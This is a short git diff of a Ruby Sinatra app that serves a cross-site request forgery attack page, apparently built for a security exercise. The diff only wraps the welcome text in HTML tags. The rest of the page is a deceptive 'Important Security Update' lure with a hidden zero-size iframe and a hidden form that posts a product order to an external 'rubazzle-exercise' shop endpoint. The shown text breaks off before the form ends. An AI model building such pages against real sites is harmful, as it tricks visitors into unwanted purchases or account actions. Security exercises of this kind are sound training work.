@@ -1,8 +1,9 @@
 require 'sinatra'
 
 get '/' do
-  'Welcome to the Important Security Update Homepage!!!! Do you want to receive Important Security Updates?
-  Click the button to agree!
+  '<h1>Welcome to the Important Security Update Homepage!!!!</h1>
+  <p>Do you want to receive Important Security Updates?
+  Click the button to agree!</p>
   <iframe style="width: 0px; height: 0px; visibility: hidden" name="hidden-frame"></iframe>
   <form name="csrf" action="http://rubazzle-exercise.herokuapp.com/orders" method="POST" enctype="application/json" target="hidden-frame">
   <input type="hidden" name="order[product]" value="Super Rubazzle Case"/>
